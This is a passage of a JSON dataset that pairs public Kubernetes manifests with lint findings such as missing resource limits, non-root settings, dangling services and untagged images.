    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: player-csv\n  namespace: baseball\n  labels:\n    app: player-csv\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: player-csv\n  template:\n    metadata:\n      labels:\n        app: player-csv\n    spec:\n      containers:\n      - name: player-csv\n        image: nschultz/fantasy-baseball-player-csv:0.6.0\n        volumeMounts:\n        - name: player-csv-data-volume\n          mountPath: /app/data\n        ports:\n        - name: web\n          containerPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /api/health\n            port: 8080\n          initialDelaySeconds: 15\n          periodSeconds: 5\n      volumes:\n      - name: player-csv-data-volume\n        persistentVolumeClaim:\n          claimName: player-csv-data-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"player-csv\" has memory limit 0"
  },
  {
    "id": "10777",
    "manifest_path": "data/manifests/the_stack_sample/sample_4144.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: node-exporter\n    k8s-app: node-exporter\n  name: node-exporter\n  namespace: instrumentation\nspec:\n  type: ClusterIP\n  clusterIP: None\n  ports:\n  - name: http-metrics\n    port: 9100\n    protocol: TCP\n  selector:\n    app: node-exporter\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:node-exporter])"
  },
  {
    "id": "10778",
    "manifest_path": "data/manifests/the_stack_sample/sample_4145.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: budgetkey-app-about\nspec:\n  ports:\n  - name: '8000'\n    port: 8000\n  selector:\n    app: app-about\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:app-about])"
  },
  {
    "id": "10779",
    "manifest_path": "data/manifests/the_stack_sample/sample_4148.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1791\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10780",
    "manifest_path": "data/manifests/the_stack_sample/sample_4148.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1791\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10781",
    "manifest_path": "data/manifests/the_stack_sample/sample_4148.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1791\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10782",
    "manifest_path": "data/manifests/the_stack_sample/sample_4148.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1791\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10783",
    "manifest_path": "data/manifests/the_stack_sample/sample_4148.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1791\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10784",
    "manifest_path": "data/manifests/the_stack_sample/sample_4149.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bindings-pythonapp\n  labels:\n    app: bindingspythonapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: bindingspythonapp\n  template:\n    metadata:\n      labels:\n        app: bindingspythonapp\n      annotations:\n        dapr.io/enabled: 'true'\n        dapr.io/id: bindings-pythonapp\n    spec:\n      containers:\n      - name: python\n        image: docker.io/dapriosamples/bindings-pythonapp:edge\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"python\" does not have a read-only root file system"
  },
  {
    "id": "10785",
    "manifest_path": "data/manifests/the_stack_sample/sample_4149.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bindings-pythonapp\n  labels:\n    app: bindingspythonapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: bindingspythonapp\n  template:\n    metadata:\n      labels:\n        app: bindingspythonapp\n      annotations:\n        dapr.io/enabled: 'true'\n        dapr.io/id: bindings-pythonapp\n    spec:\n      containers:\n      - name: python\n        image: docker.io/dapriosamples/bindings-pythonapp:edge\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"python\" is not set to runAsNonRoot"
  },
  {
    "id": "10786",
    "manifest_path": "data/manifests/the_stack_sample/sample_4149.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bindings-pythonapp\n  labels:\n    app: bindingspythonapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: bindingspythonapp\n  template:\n    metadata:\n      labels:\n        app: bindingspythonapp\n      annotations:\n        dapr.io/enabled: 'true'\n        dapr.io/id: bindings-pythonapp\n    spec:\n      containers:\n      - name: python\n        image: docker.io/dapriosamples/bindings-pythonapp:edge\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"python\" has cpu request 0"
  },
  {
    "id": "10787",
    "manifest_path": "data/manifests/the_stack_sample/sample_4149.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bindings-pythonapp\n  labels:\n    app: bindingspythonapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: bindingspythonapp\n  template:\n    metadata:\n      labels:\n        app: bindingspythonapp\n      annotations:\n        dapr.io/enabled: 'true'\n        dapr.io/id: bindings-pythonapp\n    spec:\n      containers:\n      - name: python\n        image: docker.io/dapriosamples/bindings-pythonapp:edge\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"python\" has memory limit 0"
  },
  {
    "id": "10788",
    "manifest_path": "data/manifests/the_stack_sample/sample_4151.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\n  labels:\n    app: busybox\nspec:\n  selector:\n    matchLabels:\n      app: busybox\n  template:\n    metadata:\n      labels:\n        app: busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n        name: busybox\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10789",
    "manifest_path": "data/manifests/the_stack_sample/sample_4151.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\n  labels:\n    app: busybox\nspec:\n  selector:\n    matchLabels:\n      app: busybox\n  template:\n    metadata:\n      labels:\n        app: busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n        name: busybox\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox\" does not have a read-only root file system"
  },
  {
    "id": "10790",
    "manifest_path": "data/manifests/the_stack_sample/sample_4151.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\n  labels:\n    app: busybox\nspec:\n  selector:\n    matchLabels:\n      app: busybox\n  template:\n    metadata:\n      labels:\n        app: busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n        name: busybox\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox\" is not set to runAsNonRoot"
  },
  {
    "id": "10791",
    "manifest_path": "data/manifests/the_stack_sample/sample_4151.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\n  labels:\n    app: busybox\nspec:\n  selector:\n    matchLabels:\n      app: busybox\n  template:\n    metadata:\n      labels:\n        app: busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n        name: busybox\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox\" has cpu request 0"
  },
  {
    "id": "10792",
    "manifest_path": "data/manifests/the_stack_sample/sample_4151.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: busybox\n  namespace: default\n  labels:\n    app: busybox\nspec:\n  selector:\n    matchLabels:\n      app: busybox\n  template:\n    metadata:\n      labels:\n        app: busybox\n    spec:\n      containers:\n      - image: busybox\n        command:\n        - sleep\n        - '3600'\n        imagePullPolicy: IfNotPresent\n        name: busybox\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox\" has memory limit 0"
  },
  {
    "id": "10793",
    "manifest_path": "data/manifests/the_stack_sample/sample_4154.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  namespace: monitoring\n  name: uptimerobot-heartbeat\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: uptimerobot-heartbeat\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.2\n          envFrom:\n          - secretRef:\n              name: uptimerobot-heartbeat-url\n          command:\n          - /bin/bash\n          - /app/uptimerobot-heartbeat.sh\n          volumeMounts:\n          - name: uptimerobot-heartbeat\n            mountPath: /app/uptimerobot-heartbeat.sh\n            subPath: uptimerobot-heartbeat.sh\n            readOnly: true\n        volumes:\n        - name: uptimerobot-heartbeat\n          projected:\n            defaultMode: 509\n            sources:\n            - configMap:\n                name: uptimerobot-heartbeat\n                items:\n                - key: uptimerobot-heartbeat.sh\n                  path: uptimerobot-heartbeat.sh\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Managed Job specifies ttlSecondsAfterFinished which might conflict with successfulJobsHistoryLimit and failedJobsHistoryLimit from CronJob that have default values. Final behaviour is determined by the strictest parameter, and therefore, setting ttlSecondsAfterFinished at the job level can result with unexpected behaviour with regard to finished jobs removal"
  },
  {
    "id": "10794",
    "manifest_path": "data/manifests/the_stack_sample/sample_4154.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  namespace: monitoring\n  name: uptimerobot-heartbeat\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: uptimerobot-heartbeat\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.2\n          envFrom:\n          - secretRef:\n              name: uptimerobot-heartbeat-url\n          command:\n          - /bin/bash\n          - /app/uptimerobot-heartbeat.sh\n          volumeMounts:\n          - name: uptimerobot-heartbeat\n            mountPath: /app/uptimerobot-heartbeat.sh\n            subPath: uptimerobot-heartbeat.sh\n            readOnly: true\n        volumes:\n        - name: uptimerobot-heartbeat\n          projected:\n            defaultMode: 509\n            sources:\n            - configMap:\n                name: uptimerobot-heartbeat\n                items:\n                - key: uptimerobot-heartbeat.sh\n                  path: uptimerobot-heartbeat.sh\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"uptimerobot-heartbeat\" does not have a read-only root file system"
  },
  {
    "id": "10795",
    "manifest_path": "data/manifests/the_stack_sample/sample_4154.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  namespace: monitoring\n  name: uptimerobot-heartbeat\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: uptimerobot-heartbeat\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.2\n          envFrom:\n          - secretRef:\n              name: uptimerobot-heartbeat-url\n          command:\n          - /bin/bash\n          - /app/uptimerobot-heartbeat.sh\n          volumeMounts:\n          - name: uptimerobot-heartbeat\n            mountPath: /app/uptimerobot-heartbeat.sh\n            subPath: uptimerobot-heartbeat.sh\n            readOnly: true\n        volumes:\n        - name: uptimerobot-heartbeat\n          projected:\n            defaultMode: 509\n            sources:\n            - configMap:\n                name: uptimerobot-heartbeat\n                items:\n                - key: uptimerobot-heartbeat.sh\n                  path: uptimerobot-heartbeat.sh\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"uptimerobot-heartbeat\" is not set to runAsNonRoot"
  },
  {
    "id": "10796",
    "manifest_path": "data/manifests/the_stack_sample/sample_4154.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  namespace: monitoring\n  name: uptimerobot-heartbeat\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: uptimerobot-heartbeat\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.2\n          envFrom:\n          - secretRef:\n              name: uptimerobot-heartbeat-url\n          command:\n          - /bin/bash\n          - /app/uptimerobot-heartbeat.sh\n          volumeMounts:\n          - name: uptimerobot-heartbeat\n            mountPath: /app/uptimerobot-heartbeat.sh\n            subPath: uptimerobot-heartbeat.sh\n            readOnly: true\n        volumes:\n        - name: uptimerobot-heartbeat\n          projected:\n            defaultMode: 509\n            sources:\n            - configMap:\n                name: uptimerobot-heartbeat\n                items:\n                - key: uptimerobot-heartbeat.sh\n                  path: uptimerobot-heartbeat.sh\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"uptimerobot-heartbeat\" has cpu request 0"
  },
  {
    "id": "10797",
    "manifest_path": "data/manifests/the_stack_sample/sample_4154.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  namespace: monitoring\n  name: uptimerobot-heartbeat\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: uptimerobot-heartbeat\n          image: ghcr.io/k8s-at-home/kubectl:v1.23.2\n          envFrom:\n          - secretRef:\n              name: uptimerobot-heartbeat-url\n          command:\n          - /bin/bash\n          - /app/uptimerobot-heartbeat.sh\n          volumeMounts:\n          - name: uptimerobot-heartbeat\n            mountPath: /app/uptimerobot-heartbeat.sh\n            subPath: uptimerobot-heartbeat.sh\n            readOnly: true\n        volumes:\n        - name: uptimerobot-heartbeat\n          projected:\n            defaultMode: 509\n            sources:\n            - configMap:\n                name: uptimerobot-heartbeat\n                items:\n                - key: uptimerobot-heartbeat.sh\n                  path: uptimerobot-heartbeat.sh\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"uptimerobot-heartbeat\" has memory limit 0"
  },
  {
    "id": "10798",
    "manifest_path": "data/manifests/the_stack_sample/sample_4155.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: secret-challenge\n  name: secret-challenge\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secret-challenge\n  template:\n    metadata:\n      labels:\n        app: secret-challenge\n      name: secret-challenge\n    spec:\n      securityContext:\n        runAsUser: 2000\n        runAsGroup: 2000\n        fsGroup: 2000\n      serviceAccountName: vault\n      volumes:\n      - name: secrets-store-inline\n        csi:\n          driver: secrets-store.csi.k8s.io\n          readOnly: true\n          volumeAttributes:\n            secretProviderClass: wrongsecrets-aws-secretsmanager\n      containers:\n      - image: jeroenwillemsen/wrongsecrets:1.2.0-k8s-vault\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        name: secret-challenge\n        resources: {}\n        env:\n        - name: K8S_ENV\n          value: aws\n        - name: SPECIAL_K8S_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: secrets-file\n              key: funny.entry\n        - name: SPECIAL_SPECIAL_K8S_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: funnystuff\n              key: funnier\n        - name: VAULT_ADDR\n          value: http://vault:8200\n        - name: JWT_PATH\n          value: /var/run/secrets/kubernetes.io/serviceaccount/token\n        volumeMounts:\n        - name: secrets-store-inline\n          mountPath: /mnt/secrets-store\n          readOnly: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"secret-challenge\" does not have a read-only root file system"
  },
  {
    "id": "10799",
    "manifest_path": "data/manifests/the_stack_sample/sample_4155.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: secret-challenge\n  name: secret-challenge\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secret-challenge\n  template:\n    metadata:\n      labels:\n        app: secret-challenge\n      name: secret-challenge\n    spec:\n      securityContext:\n        runAsUser: 2000\n        runAsGroup: 2000\n        fsGroup: 2000\n      serviceAccountName: vault\n      volumes:\n      - name: secrets-store-inline\n        csi:\n          driver: secrets-store.csi.k8s.io\n          readOnly: true\n          volumeAttributes:\n            secretProviderClass: wrongsecrets-aws-secretsmanager\n      containers:\n      - image: jeroenwillemsen/wrongsecrets:1.2.0-k8s-vault\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        name: secret-challenge\n        resources: {}\n        env:\n        - name: K8S_ENV\n          value: aws\n        - name: SPECIAL_K8S_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: secrets-file\n              key: funny.entry\n        - name: SPECIAL_SPECIAL_K8S_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: funnystuff\n              key: funnier\n        - name: VAULT_ADDR\n          value: http://vault:8200\n        - name: JWT_PATH\n          value: /var/run/secrets/kubernetes.io/serviceaccount/token\n        volumeMounts:\n        - name: secrets-store-inline\n          mountPath: /mnt/secrets-store\n          readOnly: true\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"vault\" not found"
  },
  {
    "id": "10800",
    "manifest_path": "data/manifests/the_stack_sample/sample_4155.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: secret-challenge\n  name: secret-challenge\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secret-challenge\n  template:\n    metadata:\n      labels:\n        app: secret-challenge\n      name: secret-challenge\n    spec:\n      securityContext:\n        runAsUser: 2000\n        runAsGroup: 2000\n        fsGroup: 2000\n      serviceAccountName: vault\n      volumes:\n      - name: secrets-store-inline\n        csi:\n          driver: secrets-store.csi.k8s.io\n          readOnly: true\n          volumeAttributes:\n            secretProviderClass: wrongsecrets-aws-secretsmanager\n      containers:\n      - image: jeroenwillemsen/wrongsecrets:1.2.0-k8s-vault\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        name: secret-challenge\n        resources: {}\n        env:\n        - name: K8S_ENV\n          value: aws\n        - name: SPECIAL_K8S_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: secrets-file\n              key: funny.entry\n        - name: SPECIAL_SPECIAL_K8S_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: funnystuff\n              key: funnier\n        - name: VAULT_ADDR\n          value: http://vault:8200\n        - name: JWT_PATH\n          value: /var/run/secrets/kubernetes.io/serviceaccount/token\n        volumeMounts:\n        - name: secrets-store-inline\n          mountPath: /mnt/secrets-store\n          readOnly: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"secret-challenge\" has cpu request 0"
  },
  {
    "id": "10801",
    "manifest_path": "data/manifests/the_stack_sample/sample_4155.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: secret-challenge\n  name: secret-challenge\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secret-challenge\n  template:\n    metadata:\n      labels:\n        app: secret-challenge\n      name: secret-challenge\n    spec:\n      securityContext:\n        runAsUser: 2000\n        runAsGroup: 2000\n        fsGroup: 2000\n      serviceAccountName: vault\n      volumes:\n      - name: secrets-store-inline\n        csi:\n          driver: secrets-store.csi.k8s.io\n          readOnly: true\n          volumeAttributes:\n            secretProviderClass: wrongsecrets-aws-secretsmanager\n      containers:\n      - image: jeroenwillemsen/wrongsecrets:1.2.0-k8s-vault\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        name: secret-challenge\n        resources: {}\n        env:\n        - name: K8S_ENV\n          value: aws\n        - name: SPECIAL_K8S_SECRET\n          valueFrom:\n            configMapKeyRef:\n              name: secrets-file\n              key: funny.entry\n        - name: SPECIAL_SPECIAL_K8S_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: funnystuff\n              key: funnier\n        - name: VAULT_ADDR\n          value: http://vault:8200\n        - name: JWT_PATH\n          value: /var/run/secrets/kubernetes.io/serviceaccount/token\n        volumeMounts:\n        - name: secrets-store-inline\n          mountPath: /mnt/secrets-store\n          readOnly: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"secret-challenge\" has memory limit 0"
  },
  {
    "id": "10802",
    "manifest_path": "data/manifests/the_stack_sample/sample_4156.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: grafana-operator\n  template:\n    metadata:\n      labels:\n        name: grafana-operator\n    spec:\n      serviceAccountName: grafana-operator\n      containers:\n      - name: grafana-operator\n        image: quay.io/integreatly/grafana-operator:v3.9.0\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - grafana-operator\n        imagePullPolicy: Always\n        env:\n        - name: TEMPLATE_PATH\n          value: /usr/local/bin/templates\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: grafana-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"grafana-operator\" does not have a read-only root file system"
  },
  {
    "id": "10803",
    "manifest_path": "data/manifests/the_stack_sample/sample_4156.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: grafana-operator\n  template:\n    metadata:\n      labels:\n        name: grafana-operator\n    spec:\n      serviceAccountName: grafana-operator\n      containers:\n      - name: grafana-operator\n        image: quay.io/integreatly/grafana-operator:v3.9.0\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - grafana-operator\n        imagePullPolicy: Always\n        env:\n        - name: TEMPLATE_PATH\n          value: /usr/local/bin/templates\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: grafana-operator\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"grafana-operator\" not found"
  },
  {
    "id": "10804",
    "manifest_path": "data/manifests/the_stack_sample/sample_4156.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: grafana-operator\n  template:\n    metadata:\n      labels:\n        name: grafana-operator\n    spec:\n      serviceAccountName: grafana-operator\n      containers:\n      - name: grafana-operator\n        image: quay.io/integreatly/grafana-operator:v3.9.0\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - grafana-operator\n        imagePullPolicy: Always\n        env:\n        - name: TEMPLATE_PATH\n          value: /usr/local/bin/templates\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: grafana-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"grafana-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "10805",
    "manifest_path": "data/manifests/the_stack_sample/sample_4156.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: grafana-operator\n  template:\n    metadata:\n      labels:\n        name: grafana-operator\n    spec:\n      serviceAccountName: grafana-operator\n      containers:\n      - name: grafana-operator\n        image: quay.io/integreatly/grafana-operator:v3.9.0\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - grafana-operator\n        imagePullPolicy: Always\n        env:\n        - name: TEMPLATE_PATH\n          value: /usr/local/bin/templates\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: grafana-operator\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"grafana-operator\" has cpu request 0"
  },
  {
    "id": "10806",
    "manifest_path": "data/manifests/the_stack_sample/sample_4156.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: grafana-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: grafana-operator\n  template:\n    metadata:\n      labels:\n        name: grafana-operator\n    spec:\n      serviceAccountName: grafana-operator\n      containers:\n      - name: grafana-operator\n        image: quay.io/integreatly/grafana-operator:v3.9.0\n        ports:\n        - containerPort: 60000\n          name: metrics\n        command:\n        - grafana-operator\n        imagePullPolicy: Always\n        env:\n        - name: TEMPLATE_PATH\n          value: /usr/local/bin/templates\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: grafana-operator\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"grafana-operator\" has memory limit 0"
  },
  {
    "id": "10807",
    "manifest_path": "data/manifests/the_stack_sample/sample_4157.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-lgtm\n  labels:\n    app: ti-community-lgtm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-lgtm\n  template:\n    metadata:\n      labels:\n        app: ti-community-lgtm\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-lgtm\n        image: ticommunityinfra/tichi-lgtm-plugin:v1.9.0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"ti-community-lgtm\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "10808",
    "manifest_path": "data/manifests/the_stack_sample/sample_4157.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: ti-community-lgtm\n  labels:\n    app: ti-community-lgtm\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: ti-community-lgtm\n  template:\n    metadata:\n      labels:\n        app: ti-community-lgtm\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: ti-community-lgtm\n        image: ticommunityinfra/tichi-lgtm-plugin:v1.9.0\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 80\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: external-plugins-config\n          mountPath: /etc/external_plugins_config\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: github-token\n      - name: external-plugins-config\n        configMap:\n          name: external-plugins-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ti-community-lgtm\" does not have a read-only root file system"
  },
  {
    "id": "10809",
    "manifest_path": "data/manifests/the_stack_sample/sample_4157.yaml",
